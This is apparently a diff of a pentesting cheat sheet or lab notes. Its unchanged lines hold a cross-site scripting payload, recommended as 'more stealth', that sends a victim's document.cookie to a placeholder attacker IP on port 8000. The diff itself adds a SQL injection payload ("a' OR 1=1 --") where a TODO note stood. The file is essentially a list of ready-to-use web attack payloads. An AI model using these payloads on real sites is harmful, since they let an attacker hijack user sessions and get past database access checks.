@@ -33,10 +33,11 @@ Not the best approach, generates a bunch of requests, very loud
 More stealth, use this one
 
     <script>i=document.createElement('img');i.src='http://<attacker IP>:8000/'+document.cookie;document.body.appendChild(img)</script>
-	
+    
+###SQLI
+		a' OR 1=1 --
 
-## TODO: write some SQLi payloads used in the lab
-
+		
 
 ## Vulnerabilities Scenario and actions
 ### Steps for Vulnerability Analysis
